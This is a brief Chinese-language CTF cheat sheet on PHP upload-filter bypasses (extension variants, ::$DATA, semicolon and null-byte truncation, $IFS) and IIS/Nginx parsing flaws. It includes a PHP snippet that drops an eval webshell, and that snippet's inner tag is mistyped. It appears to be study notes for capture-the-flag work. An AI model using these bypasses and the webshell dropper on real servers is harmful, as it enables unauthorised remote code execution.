TODO:  
## 上传二次渲染
有时候上传文件时php会用组件把你的文件格式更改为jpg，需要用/ctf/web/php/php_jpg.php中的脚本进行绕过

## 文件解析
https://blog.csdn.net/wn314/article/details/77074477
https://www.cnblogs.com/shellr00t/p/6426856.html

```
截断，分号 php=>ptml,php2 php3 php4 phpss...  
flag.php:1  
flag.php::$DATA  
空格可以使用$IFS代替
```
## 回调后门
https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html

### getshell
目录解析 1.asp/1.png
分号阶段 1.asp;.png
改包 00截断

IIS7.0 .5 Nginx<8.03畸形解析漏洞
默认FAST-CGI开启状态上传一个1.jpg内容
```php
<?php fputs(fopen('shell.php','w'),'?<php eval($_POST[cmd]?>');?>
```
访问1.jpg/.php。在这个目录下就会生成一句话木马shell.php